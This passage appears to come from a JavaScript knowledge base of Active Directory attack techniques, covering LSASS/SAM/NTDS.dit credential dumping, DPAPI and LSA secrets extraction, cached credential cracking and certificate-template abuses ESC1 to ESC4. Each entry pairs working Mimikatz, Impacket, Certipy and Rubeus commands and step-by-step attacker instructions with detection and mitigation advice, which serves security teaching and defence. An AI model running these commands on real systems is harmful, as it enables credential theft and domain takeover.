      "Local Administrator or SYSTEM access on the target machine (for LSASS and SAM)",
      "Domain Admin, Backup Operator, or NTDS.dit file access (for NTDS.dit)",
      "LSASS must not be protected by Credential Guard or RunAsPPL (or these must be bypassed)"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Mimikatz (LSASS)",
        command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"",
        description: "Dumps credentials from LSASS memory including NTLM hashes, Kerberos tickets, and potentially plaintext passwords"
      },
      {
        name: "Mimikatz (SAM)",
        command: "mimikatz.exe \"privilege::debug\" \"lsadump::sam\"",
        description: "Extracts local account hashes from the SAM database"
      },
      {
        name: "comsvcs.dll (LSASS dump)",
        command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",
        description: "Creates a memory dump of LSASS using a built-in Windows DLL (no external tools needed)"
      },
      {
        name: "ProcDump (LSASS)",
        command: "procdump.exe -ma lsass.exe lsass.dmp",
        description: "Creates a memory dump of LSASS using the Sysinternals ProcDump utility (signed by Microsoft)"
      },
      {
        name: "Mimikatz (minidump)",
        command: "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\"",
        description: "Extracts credentials from an offline LSASS memory dump"
      },
      {
        name: "reg save (SAM)",
        command: "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save && reg save HKLM\\SECURITY security.save",
        description: "Saves SAM, SYSTEM, and SECURITY registry hives for offline credential extraction"
      },
      {
        name: "Impacket secretsdump (SAM)",
        command: "python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL",
        description: "Extracts hashes from saved SAM/SYSTEM/SECURITY registry hives"
      },
      {
        name: "ntdsutil (NTDS.dit)",
        command: "ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ntds_dump\" quit quit",
        description: "Creates an IFM (Install From Media) backup of the AD database including NTDS.dit and registry hives"
      },
      {
        name: "Impacket secretsdump (NTDS.dit)",
        command: "python3 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes-only LOCAL",
        description: "Extracts all domain hashes from an offline NTDS.dit copy"
      },
      {
        name: "Volume Shadow Copy",
        command: "vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit",
        description: "Creates a volume shadow copy to access the locked NTDS.dit file"
      }
    ],
    steps: [
      "Step 1: For LSASS dumping, first check if protections are in place. Verify Credential Guard status: Get-CimInstance -ClassName Win32_DeviceGuard. Check RunAsPPL: Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name RunAsPPL.",
      "Step 2: If LSASS is unprotected, dump credentials directly with Mimikatz sekurlsa::logonpasswords. For a stealthier approach, create a memory dump first using comsvcs.dll or ProcDump, then analyze offline.",
      "Step 3: For SAM extraction, save the registry hives: reg save HKLM\\SAM sam.save, reg save HKLM\\SYSTEM system.save. Transfer to your attack host and extract with Impacket secretsdump.py -sam sam.save -system system.save LOCAL.",
      "Step 4: For NTDS.dit on a domain controller, use one of several methods: ntdsutil IFM creation, Volume Shadow Copy (vssadmin), or direct access if you have a backup. All require administrative access.",
      "Step 5: Extract credentials from the NTDS.dit copy using Impacket: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL. This provides all domain user NTLM hashes.",
      "Step 6: Alternatively, use DCSync (secretsdump.py remotely) to extract credentials without touching the NTDS.dit file directly, which is stealthier.",
      "Step 7: Analyze extracted credentials for password reuse, weak passwords, and privileged account hashes. Use the hashes for pass-the-hash lateral movement.",
      "Step 8: Check for WDigest plaintext passwords in the LSASS dump. If UseLogonCredential is set to 1, cleartext passwords may be available."
    ],
    detection: "LSASS access is detectable via Sysmon Event ID 10 (ProcessAccess) targeting lsass.exe, particularly with access masks including PROCESS_VM_READ (0x0010). Event ID 4656 and 4663 (Object Access) track handle creation to LSASS. Monitor for suspicious process creation: procdump.exe, comsvcs.dll with MiniDump, and mimikatz.exe. For SAM extraction, monitor for reg.exe accessing HKLM\\SAM and HKLM\\SYSTEM. For NTDS.dit, monitor ntdsutil.exe execution and vssadmin shadow copy creation. Event ID 4688 (Process Creation) with command line auditing captures these commands. Windows Defender ATP and other EDR solutions have specific detections for credential dumping techniques.",
    mitigation: "Enable Credential Guard on Windows 10+ and Server 2016+ to protect LSASS with virtualization-based security. Enable LSA Protection (RunAsPPL) via registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL = 1. Disable WDigest: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential = 0. Deploy EDR solutions with credential theft detection. Implement tiered administration to limit where privileged credentials are exposed. Use Remote Credential Guard for RDP sessions to prevent credential caching on remote systems. Restrict Debug privilege usage via Group Policy.",
    references: [
      "https://attack.mitre.org/techniques/T1003/",
      "https://attack.mitre.org/techniques/T1003/001/",
      "https://attack.mitre.org/techniques/T1003/002/",
      "https://attack.mitre.org/techniques/T1003/003/"
    ]
  },
  {
    id: "AD-022",
    name: "DPAPI Abuse",
    category: "credential_theft",
    description: "The Data Protection API (DPAPI) is a Windows cryptographic API used by applications and the operating system to protect sensitive data such as passwords, encryption keys, and certificates. DPAPI uses a master key derived from the user's password to encrypt data. When a user's password changes, the master key is re-encrypted with the new password, and a backup key encrypted with the domain's DPAPI backup key is also stored. An attacker who obtains a user's DPAPI master key (from their profile directory) and either their password/hash or the domain DPAPI backup key can decrypt any DPAPI-protected data for that user. This includes Chrome/Edge saved passwords, Windows Credential Manager entries, Wi-Fi passwords, RDP connection credentials, and encrypted files. The domain DPAPI backup key, stored on domain controllers and accessible via the LSADUMP::BACKUPKEY command in Mimikatz, can decrypt any user's DPAPI-protected data across the entire domain, making it one of the most valuable secrets an attacker can obtain.",
    prerequisites: [
      "For user-level DPAPI: access to user's profile directory and their password/NTLM hash",
      "For domain-level DPAPI: Domain Admin access to extract the domain DPAPI backup key",
      "Target system access to read DPAPI master key files and encrypted blobs"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Mimikatz (domain backup key)",
        command: "mimikatz.exe \"lsadump::backupkeys /system:dc01.domain.local /export\"",
        description: "Exports the domain DPAPI backup key which can decrypt any user's DPAPI-protected data"
      },
      {
        name: "Mimikatz (master key decrypt)",
        command: "mimikatz.exe \"dpapi::masterkey /in:masterkey_file /rpc\"",
        description: "Decrypts a DPAPI master key using the domain controller's backup key via RPC"
      },
      {
        name: "Mimikatz (Chrome passwords)",
        command: "mimikatz.exe \"dpapi::chrome /in:\"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\"",
        description: "Decrypts saved Chrome passwords using DPAPI"
      },
      {
        name: "Mimikatz (credential files)",
        command: "mimikatz.exe \"dpapi::cred /in:C:\\Users\\target\\AppData\\Local\\Microsoft\\Credentials\\CREDENTIAL_FILE /masterkey:DECRYPTED_KEY\"",
        description: "Decrypts Windows Credential Manager entries"
      },
      {
        name: "SharpDPAPI",
        command: "SharpDPAPI.exe credentials /target:C:\\Users\\target /password:UserPassword",
        description: "Decrypts all DPAPI-protected credential files for a user given their password"
      },
      {
        name: "SharpDPAPI (backupkey)",
        command: "SharpDPAPI.exe backupkey /nowrap",
        description: "Retrieves the domain DPAPI backup key (requires Domain Admin)"
      }
    ],
    steps: [
      "Step 1: As Domain Admin, extract the domain DPAPI backup key using Mimikatz: lsadump::backupkeys /system:dc01.domain.local /export. This key can decrypt any user's master key across the entire domain.",
      "Step 2: Locate target user DPAPI master keys in: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\. Each file is a master key that protects a set of encrypted data.",
      "Step 3: Decrypt the master keys using either the domain backup key or the user's password/hash. With Mimikatz: dpapi::masterkey /in:<masterkey_file> /pvk:domain_backup.pvk (with domain backup key) or /rpc (queries the DC directly).",
      "Step 4: Once master keys are decrypted, enumerate DPAPI-protected data. Check: Credential Manager (AppData\\Local\\Microsoft\\Credentials), browser passwords, Wi-Fi profiles, certificate private keys.",
      "Step 5: Decrypt credential blobs using Mimikatz dpapi::cred with the decrypted master key. This reveals stored passwords for websites, network shares, RDP connections, and other services.",
      "Step 6: Extract browser passwords using dpapi::chrome for Chrome or SharpDPAPI for automated extraction across multiple browsers.",
      "Step 7: For a domain-wide credential harvest, combine the domain backup key with access to user profiles (via file shares or direct access) to decrypt DPAPI data for all users without needing individual passwords."
    ],
    detection: "Monitor for access to DPAPI master key files (C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect). Track calls to the CryptUnprotectData API, especially from unexpected processes. Event ID 4662 on domain controllers shows access to the DPAPI backup key object (BCKUPKEY secret in the domain). Monitor for Mimikatz-related indicators: process access to LSASS, loading of specific DLLs. Track access to browser credential databases and Windows Credential Manager files from non-browser processes. SharpDPAPI execution can be detected through .NET assembly loading patterns and command-line arguments.",
    mitigation: "Implement Credential Guard which provides DPAPI isolation. Rotate the domain DPAPI backup key if it is suspected to be compromised (this is a complex operation). Educate users about the risks of saving passwords in browsers and Credential Manager. Deploy enterprise password managers instead of relying on Windows credential storage. Monitor and alert on DPAPI key access patterns. Restrict administrative access to user profile directories.",
    references: [
      "https://attack.mitre.org/techniques/T1555/004/",
      "https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/",
      "https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107"
    ]
  },
  {
    id: "AD-023",
    name: "LSA Secrets Extraction",
    category: "credential_theft",
    description: "LSA Secrets are a protected storage mechanism in Windows used by the Local Security Authority (LSA) to store sensitive system data. The secrets are stored in the HKLM\\SECURITY\\Policy\\Secrets registry key and are encrypted with a key derived from the SYSTEM bootkey. LSA Secrets contain: service account passwords (for services configured to run under domain accounts), auto-logon credentials, VPN and dial-up passwords, computer account passwords, cached domain credentials (MS-Cache/DCC2 hashes), DPAPI master keys, and other system-level secrets. Extracting LSA Secrets requires SYSTEM-level access and the ability to read the SECURITY and SYSTEM registry hives. The secrets are decrypted using the bootkey (SYSKEY) extracted from the SYSTEM hive. This is a particularly valuable credential source because service account passwords are stored in plaintext (encrypted by the LSA but recoverable with the bootkey), and these accounts often have elevated privileges. The cached domain credentials (DCC2 hashes) can be cracked offline, though they use a slow PBKDF2-based algorithm.",
    prerequisites: [
      "SYSTEM or local Administrator access on the target machine",
      "Ability to read the SECURITY and SYSTEM registry hives"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"privilege::debug\" \"lsadump::secrets\"",
        description: "Dumps all LSA Secrets from the local machine"
      },
      {
        name: "Impacket secretsdump (remote)",
        command: "python3 secretsdump.py domain.local/Administrator@target -hashes :NTLM_HASH",
        description: "Remotely extracts LSA Secrets, SAM hashes, and cached credentials"
      },
      {
        name: "reg save (offline)",
        command: "reg save HKLM\\SECURITY security.save && reg save HKLM\\SYSTEM system.save",
        description: "Saves the SECURITY and SYSTEM hives for offline extraction"
      },
      {
        name: "Impacket secretsdump (offline)",
        command: "python3 secretsdump.py -security security.save -system system.save LOCAL",
        description: "Extracts LSA Secrets from saved registry hives"
      },
      {
        name: "CrackMapExec",
        command: "crackmapexec smb target -u Admin -H HASH --lsa",
        description: "Remotely dumps LSA Secrets from the target system"
      }
    ],
    steps: [
      "Step 1: Gain SYSTEM or administrative access on the target machine. This can be through PsExec, service exploitation, or privilege escalation.",
      "Step 2: Extract LSA Secrets directly using Mimikatz lsadump::secrets on the target machine, or remotely using Impacket secretsdump.py.",
      "Step 3: For offline extraction, save the SECURITY and SYSTEM registry hives: reg save HKLM\\SECURITY security.save and reg save HKLM\\SYSTEM system.save. Transfer them to your analysis machine.",
      "Step 4: Parse the LSA Secrets output. Look for: _SC_ prefixed entries (service account credentials in plaintext), DefaultPassword (auto-logon credentials), NL$KM (cached credential encryption key), $MACHINE.ACC (computer account password), and DPAPI keys.",
      "Step 5: Service account passwords (entries starting with _SC_) are stored in reversible encryption and will be displayed in plaintext. These often belong to privileged domain accounts.",
      "Step 6: Extract cached domain credentials (DCC2/MS-Cache2 hashes). These are the last N domain accounts that authenticated to the machine. Crack them using hashcat mode 2100: hashcat -m 2100 dcc2_hashes.txt wordlist.txt.",
      "Step 7: Use extracted service account credentials for lateral movement and privilege escalation. Service accounts frequently have access to databases, file shares, and other critical infrastructure."
    ],
    detection: "Monitor for access to SECURITY and SYSTEM registry hives via Event ID 4656 and 4663. Track reg.exe execution with commands accessing HKLM\\SECURITY. Sysmon Event ID 1 (Process Creation) with command-line arguments matching registry save operations. Monitor for Impacket secretsdump.py remote access patterns: service creation, named pipe access, and remote registry access. Event ID 7045 (Service Installation) may indicate Impacket creating a temporary service for remote extraction. EDR solutions can detect in-memory credential extraction from LSA.",
    mitigation: "Minimize the use of service accounts with stored passwords. Use Group Managed Service Accounts (gMSAs) instead, which do not store passwords in LSA Secrets. Disable auto-logon to prevent DefaultPassword storage. Reduce the number of cached domain credentials by setting the CachedLogonsCount registry value to a minimum (1 or 2). Implement Credential Guard to protect cached credentials. Deploy endpoint detection solutions that monitor LSA Secret access. Restrict administrative access to systems storing sensitive credentials.",
    references: [
      "https://attack.mitre.org/techniques/T1003/004/",
      "https://www.passcape.com/index.php?section=docsys&cmd=details&id=23",
      "https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets"
    ]
  },
  {
    id: "AD-024",
    name: "Cached Credentials Extraction",
    category: "credential_theft",
    description: "Windows caches domain credentials locally in the registry to allow users to log in when the domain controller is unreachable. These cached credentials, known as Domain Cached Credentials (DCC) or MS-Cache/MS-Cache2, are stored in the HKLM\\SECURITY\\Cache registry key. The cached credentials are PBKDF2-derived hashes (DCC2 format in modern Windows versions) of the user's password, salted with the username. By default, Windows caches the last 10 domain logon credentials (configurable via the CachedLogonsCount registry value or Group Policy). While DCC2 hashes are significantly slower to crack than NTLM hashes due to the PBKDF2 key derivation (4096 iterations of HMAC-SHA1), they can still be cracked with sufficient GPU resources and weak passwords. Notably, DCC2 hashes cannot be used for pass-the-hash attacks -- they must be cracked to obtain the plaintext password. This attack is particularly relevant for laptop users who cache credentials for offline access and for servers where Domain Admins have previously logged in.",
    prerequisites: [
      "SYSTEM or local Administrator access on the target machine",
      "Cached credentials present (at least one domain user has previously logged in)"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"privilege::debug\" \"lsadump::cache\"",
        description: "Extracts cached domain credentials from the registry"
      },
      {
        name: "Impacket secretsdump",
        command: "python3 secretsdump.py domain.local/Administrator@target -hashes :NTLM_HASH",
        description: "Remotely extracts cached credentials along with other credential data"
      },
      {
        name: "CrackMapExec",
        command: "crackmapexec smb target -u Admin -H HASH --lsa",
        description: "Extracts cached credentials remotely via LSA dump"
      },
      {
        name: "hashcat (DCC2)",
        command: "hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
        description: "Cracks DCC2 (MS-Cache v2) hashes using hashcat"
      }
    ],
    steps: [
      "Step 1: Gain administrative or SYSTEM access on the target machine.",
      "Step 2: Extract cached credentials using Mimikatz lsadump::cache, Impacket secretsdump.py, or CrackMapExec with --lsa flag.",
      "Step 3: The output will show DCC2 hashes in the format: domain\\username:hash. Note that these are NOT NTLM hashes and cannot be used for pass-the-hash.",
      "Step 4: Format the hashes for hashcat: $DCC2$10240#username#hash (DCC2 format with iteration count).",
      "Step 5: Crack the DCC2 hashes using hashcat mode 2100. Note that DCC2 cracking is approximately 1000x slower than NTLM cracking due to the PBKDF2 key derivation.",
      "Step 6: Prioritize cracking by targeting accounts with the most privilege. Check which cached accounts are Domain Admins or have other elevated access.",
      "Step 7: Use the recovered plaintext passwords for domain authentication, lateral movement, or further attacks like DCSync if the account has sufficient privileges."
    ],
    detection: "Monitor for access to the HKLM\\SECURITY\\Cache registry key. Track Mimikatz and Impacket execution patterns. Event ID 4656 and 4663 for access to the SECURITY registry hive. Remote credential extraction via secretsdump.py generates Event ID 7045 (Service Installation) and named pipe access events. Monitor for hashcat or similar cracking tool execution on systems. EDR solutions can detect the specific API calls used to access cached credentials.",
    mitigation: "Reduce the number of cached credentials to the minimum required (typically 1-2 for laptops, 0 for servers): Group Policy > Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Interactive logon: Number of previous logons to cache. Ensure Domain Admin accounts never log into workstations or member servers directly. Use the Protected Users group which prevents credential caching. Implement strong password policies to make offline cracking less effective. Deploy Credential Guard to protect cached credentials.",
    references: [
      "https://attack.mitre.org/techniques/T1003/005/",
      "https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials"
    ]
  },
  // -------------------------------------------------------------------------
  // Certificate Attacks (AD CS)
  // -------------------------------------------------------------------------
  {
    id: "AD-025",
    name: "ESC1 - Misconfigured Certificate Template with Arbitrary SAN",
    category: "certificate_abuse",
    description: "ESC1 is the most commonly exploited AD CS (Active Directory Certificate Services) misconfiguration. It occurs when a certificate template allows enrollees to supply an arbitrary Subject Alternative Name (SAN) in their certificate request. The SAN field in a certificate can contain a User Principal Name (UPN) that Active Directory uses for authentication. If a low-privileged user can request a certificate with a SAN specifying a Domain Admin's UPN, that certificate can be used to authenticate as the Domain Admin. The vulnerability requires three conditions: (1) the template allows requestor-specified SANs (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is set), (2) the template has an EKU (Extended Key Usage) that permits authentication (Client Authentication, PKINIT Client Authentication, Smart Card Logon, or Any Purpose), and (3) the requesting user has enrollment rights on the template. This is an extremely common finding in enterprise environments because the default 'WebServer' template has the enrollee supplies subject flag set, and administrators often clone it for user authentication certificates without removing this flag.",
    prerequisites: [
      "AD CS role installed in the domain with an Enterprise CA",
      "A certificate template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag enabled",
      "The template must have an authentication EKU (Client Authentication OID 1.3.6.1.5.5.7.3.2, or similar)",
      "The attacker must have enrollment rights on the template"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Certify",
        command: "Certify.exe find /vulnerable",
        description: "Enumerates AD CS templates and identifies ESC1 and other vulnerable configurations"
      },
      {
        name: "Certify (request)",
        command: "Certify.exe request /ca:ca.domain.local\\domain-CA /template:VulnTemplate /altname:Administrator",
        description: "Requests a certificate with an arbitrary SAN specifying the Administrator UPN"
      },
      {
        name: "Certipy (enumerate)",
        command: "certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable",
        description: "Enumerates vulnerable AD CS configurations from Linux"
      },
      {
        name: "Certipy (request)",
        command: "certipy req -u user@domain.local -p password -ca domain-CA -target ca.domain.local -template VulnTemplate -upn Administrator@domain.local",
        description: "Requests a certificate with the Administrator UPN from Linux"
      },
      {
        name: "Certipy (authenticate)",
        command: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1",
        description: "Authenticates using the obtained certificate to get the Administrator's NTLM hash via PKINIT"
      },
      {
        name: "Rubeus (PKINIT)",
        command: "Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpassword /ptt",
        description: "Requests a TGT using the certificate for PKINIT authentication"
      }
    ],
    steps: [
      "Step 1: Enumerate AD CS configuration and identify vulnerable templates. Use Certify find /vulnerable from Windows or certipy find -vulnerable from Linux. Look for templates with ENROLLEE_SUPPLIES_SUBJECT flag and authentication EKU.",
      "Step 2: Verify you have enrollment rights on the vulnerable template. Check the template's security descriptor for Enroll or AutoEnroll permissions granted to your user or a group you belong to (commonly Domain Users or Authenticated Users).",
      "Step 3: Request a certificate specifying a high-privilege user in the SAN. Use Certify: Certify.exe request /ca:ca.domain.local\\domain-CA /template:VulnTemplate /altname:Administrator. From Linux: certipy req -u user@domain.local -p password -ca domain-CA -template VulnTemplate -upn Administrator@domain.local.",
      "Step 4: If the request succeeds, you receive a certificate (PFX/PEM) that contains the Administrator's UPN in the SAN field. This certificate can be used for Kerberos PKINIT authentication.",
      "Step 5: Authenticate using the certificate. From Windows: Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt. From Linux: certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1.",
      "Step 6: The PKINIT authentication returns a TGT for the Administrator account. Certipy also recovers the NTLM hash via the U2U technique during authentication.",
      "Step 7: Use the obtained TGT or NTLM hash for further attacks: DCSync, lateral movement, persistence.",
      "Step 8: The certificate remains valid for the duration of its validity period (often 1 year), providing long-term persistence even if the Administrator's password is changed."
    ],
    detection: "Monitor for Event ID 4886 (Certificate Services received a certificate request) and 4887 (Certificate Services approved a certificate request) on the CA server. Alert on certificate requests where the SAN UPN does not match the requesting user's UPN. Event ID 4768 (TGT Request) with certificate-based authentication (pre-auth type 16) from unexpected sources. Microsoft Defender for Identity can detect ESC1 exploitation. Monitor for Certify.exe and Certipy execution. Audit certificate template permissions regularly.",
    mitigation: "Remove the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag from all templates used for authentication. If requestor-supplied SANs are needed (e.g., web server certificates), ensure the template does not have authentication EKUs. Enable CA certificate manager approval for sensitive templates to require manual review of certificate requests. Restrict enrollment permissions to only the users/groups that need them. Audit all certificate templates: certutil -v -dstemplate > templates.txt. Implement the 'Supply in the request' removal on all authentication templates.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc1",
      "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#esc1"
    ]
  },
  {
    id: "AD-026",
    name: "ESC2 - Misconfigured Certificate Template with Any Purpose EKU",
    category: "certificate_abuse",
    description: "ESC2 targets certificate templates configured with the 'Any Purpose' EKU (OID 2.5.29.37.0) or no EKU at all. The Any Purpose EKU means the certificate can be used for any purpose including client authentication, code signing, and server authentication. A certificate with no EKU restrictions is treated as a subordinate CA certificate under certain conditions, which can be even more dangerous. While ESC2 alone may not directly allow impersonation like ESC1 (if the template does not allow requestor-supplied SANs), the Any Purpose EKU means the certificate can be used as a client authentication certificate. Combined with other misconfigurations or if the certificate contains the user's identity, it can be used for authentication escalation. The real danger comes when ESC2 templates have other misconfigurations layered on top, or when the certificate is used in unexpected authentication contexts.",
    prerequisites: [
      "AD CS Enterprise CA deployed",
      "A certificate template with Any Purpose EKU or no EKU restrictions",
      "Enrollment rights on the template"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Certify",
        command: "Certify.exe find /vulnerable",
        description: "Identifies templates with Any Purpose EKU or no EKU"
      },
      {
        name: "Certipy",
        command: "certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable -stdout",
        description: "Identifies ESC2 vulnerable templates from Linux with detailed output"
      },
      {
        name: "Certify (request)",
        command: "Certify.exe request /ca:ca.domain.local\\domain-CA /template:AnyPurposeTemplate",
        description: "Requests a certificate from the Any Purpose template"
      },
      {
        name: "Certipy (request)",
        command: "certipy req -u user@domain.local -p password -ca domain-CA -target ca.domain.local -template AnyPurposeTemplate",
        description: "Requests a certificate from the vulnerable template from Linux"
      }
    ],
    steps: [
      "Step 1: Enumerate templates with Certify or Certipy. Look for templates where the EKU contains 'Any Purpose' (OID 2.5.29.37.0) or where the EKU list is empty (no restrictions).",
      "Step 2: Check enrollment permissions on identified templates. Verify that your user or a group you belong to has Enroll rights.",
      "Step 3: Request a certificate from the vulnerable template. The certificate will contain your identity in the subject and will be valid for any purpose including client authentication.",
      "Step 4: If the template also allows requestor-supplied SANs (combining ESC1+ESC2), request a certificate with a privileged user's UPN in the SAN.",
      "Step 5: Use the certificate for PKINIT authentication. Even without SAN manipulation, the Any Purpose certificate can be used for client authentication as your own user, which may provide access to resources that require certificate-based authentication.",
      "Step 6: If the certificate has no EKU at all, investigate whether it can be used as a subordinate CA certificate for issuing additional certificates."
    ],
    detection: "Monitor certificate enrollment events (Event ID 4886, 4887) for templates with Any Purpose EKU. Audit certificate template configurations regularly. Alert on certificates issued from Any Purpose templates being used for Kerberos authentication (Event ID 4768 with pre-auth type 16). Track template modification events that add the Any Purpose EKU.",
    mitigation: "Remove the Any Purpose EKU from all certificate templates that do not explicitly require it. Replace it with specific EKUs matching the intended use (Client Authentication, Server Authentication, etc.). If a template must have broad EKU usage, restrict enrollment permissions to only necessary accounts. Review templates with no EKU restrictions and add appropriate EKUs. Implement CA manager approval for templates with broad capabilities.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc2"
    ]
  },
  {
    id: "AD-027",
    name: "ESC3 - Enrollment Agent Certificate Abuse",
    category: "certificate_abuse",
    description: "ESC3 exploits the Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1) and enrollment agent certificates. An enrollment agent certificate allows its holder to request certificates on behalf of other users. The attack is a two-step process: first, the attacker obtains an enrollment agent certificate from a template that grants them enrollment and has the Certificate Request Agent EKU. Then, the attacker uses this enrollment agent certificate to co-sign a certificate request on behalf of another user (such as a Domain Admin) from a second template that requires enrollment agent co-signing and has an authentication EKU. This effectively allows the attacker to obtain authentication certificates for any user, similar to ESC1 but through a different mechanism. The enrollment agent concept was designed for scenarios where helpdesk staff need to enroll smart card certificates for users, but when enrollment agent templates are broadly accessible, they become a significant escalation vector.",
    prerequisites: [
      "A template with Certificate Request Agent EKU that grants enrollment to the attacker",
      "A second template that allows enrollment agents to request certificates on behalf of others and has authentication EKU",
      "The second template must not restrict which enrollment agents can use it or must allow the attacker's enrollment agent"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Certify (step 1)",
        command: "Certify.exe request /ca:ca.domain.local\\domain-CA /template:EnrollmentAgentTemplate",
        description: "Obtains an enrollment agent certificate"
      },
      {
        name: "Certify (step 2)",
        command: "Certify.exe request /ca:ca.domain.local\\domain-CA /template:UserTemplate /onbehalfof:DOMAIN\\Administrator /enrollcert:enrollmentagent.pfx /enrollcertpw:password",
        description: "Uses the enrollment agent certificate to request a certificate on behalf of Administrator"
      },
      {
        name: "Certipy (step 1)",
        command: "certipy req -u user@domain.local -p password -ca domain-CA -target ca.domain.local -template EnrollmentAgent",
        description: "Obtains an enrollment agent certificate from Linux"
      },
      {
        name: "Certipy (step 2)",
        command: "certipy req -u user@domain.local -p password -ca domain-CA -target ca.domain.local -template User -on-behalf-of 'DOMAIN\\Administrator' -pfx enrollmentagent.pfx",
        description: "Requests a certificate on behalf of Administrator using the enrollment agent cert"
      }
    ],
    steps: [
      "Step 1: Enumerate templates with the Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1). Use Certify find or Certipy find to identify these templates.",
      "Step 2: Request an enrollment agent certificate from the identified template: Certify.exe request /ca:ca.domain.local\\domain-CA /template:EnrollmentAgentTemplate.",
      "Step 3: Identify a second template that allows enrollment agent co-signing and has an authentication EKU. This is often the default 'User' template or similar.",
      "Step 4: Use the enrollment agent certificate to request a certificate on behalf of a privileged user: Certify.exe request /ca:ca.domain.local\\domain-CA /template:User /onbehalfof:DOMAIN\\Administrator /enrollcert:ea.pfx /enrollcertpw:password.",
      "Step 5: Authenticate using the obtained certificate via PKINIT: Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /ptt.",
      "Step 6: The certificate is valid for the duration of the template's validity period, providing persistent access."
    ],
    detection: "Monitor for enrollment agent certificate requests (Event ID 4886/4887 with Certificate Request Agent EKU). Alert on certificates requested on behalf of other users (the 'Requester' field differs from the 'Subject' in the certificate). Audit enrollment agent template permissions. Track which users hold enrollment agent certificates.",
    mitigation: "Restrict enrollment agent templates to dedicated enrollment agent accounts (e.g., helpdesk smart card enrollment stations). Configure enrollment restrictions on the CA to limit which enrollment agents can request certificates for which users/templates: certsrv.msc > CA Properties > Enrollment Agents tab. Remove enrollment rights from broad groups like Domain Users on enrollment agent templates. Implement issuance policies to control certificate enrollment.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc3"
    ]
  },
  {
    id: "AD-028",
    name: "ESC4 - Vulnerable Certificate Template ACLs",
    category: "certificate_abuse",
    description: "ESC4 occurs when a low-privileged user has write permissions (WriteDACL, WriteOwner, WriteProperty, or GenericAll/GenericWrite) on a certificate template object in Active Directory. Certificate templates are stored as objects in CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local. If an attacker can modify a template, they can reconfigure it to be vulnerable to ESC1 (by enabling the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag and adding an authentication EKU) and then exploit the modified template to obtain a certificate for any user. After exploitation, the attacker can restore the original template configuration to cover their tracks. This attack is particularly dangerous because template ACLs are often overlooked during security assessments, and misconfigured ACLs can be inherited from parent containers or granted during template creation.",
    prerequisites: [
      "Write permissions (GenericAll, GenericWrite, WriteProperty, WriteDACL, or WriteOwner) on a certificate template AD object",
      "The template must be published on an Enterprise CA (or the attacker must be able to publish it)"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Certify (enumerate ACLs)",
        command: "Certify.exe find /vulnerable",
        description: "Identifies templates with weak ACLs as part of vulnerability enumeration"
      },
      {
        name: "Certipy (enumerate)",
        command: "certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable",
        description: "Identifies ESC4 vulnerable template ACLs from Linux"
      },
      {
        name: "PowerView (check ACLs)",
        command: "Get-DomainObjectAcl -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner'}",
        description: "Enumerates write permissions on all certificate template objects"
      },
      {
